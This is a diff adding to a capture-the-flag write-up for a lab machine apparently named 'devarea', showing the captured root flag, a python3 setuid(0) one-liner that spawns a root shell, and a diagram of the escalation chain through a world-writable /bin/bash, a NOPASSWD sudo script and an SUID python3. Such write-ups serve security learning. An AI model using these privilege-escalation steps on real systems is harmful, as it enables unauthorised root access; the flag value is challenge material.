@@ -248,8 +248,6 @@ Matching Defaults entries for dev_ryan on devarea:
 User dev_ryan may run the following commands on devarea:
     (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh
         web-stop, !/opt/syswatch/syswatch.sh web-restart
-
-
 ```
 
 
@@ -267,5 +265,37 @@ root
 # cat /root/root.txt
 cat /root/root.txt
 d7067b9d4a5321eb2fb8b40d73893e2c
+```
+
+```
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+
+| Call | What it does |
+|---|---|
+| `os.setuid(0)` | Sets UID to 0 (root) — allowed because SUID bit gives effective UID = root |
+| `os.system("/bin/sh")` | Spawns shell **inheriting root UID** |
+
+**Why does SUID matter?**
+- Normal binary: runs as the **user who launches it**
+- SUID binary: runs as the **owner** (root) regardless of who launches it
+- So even as `dev_ryan`, python3 runs with root privileges
+
+---
+
+### The Full Chain Visualized
+
+```
+world-writable /bin/bash
+        +
+sudo NOPASSWD syswatch.sh (calls /bin/bash internally)
+        ↓
+replace /bin/bash with payload (using dd, in-place)
+        ↓
+sudo syswatch.sh → root executes payload → python3 gets SUID
+        ↓
+python3 setuid(0) → root shell
+        ↓
+cat /root/root.txt 
 ```
 
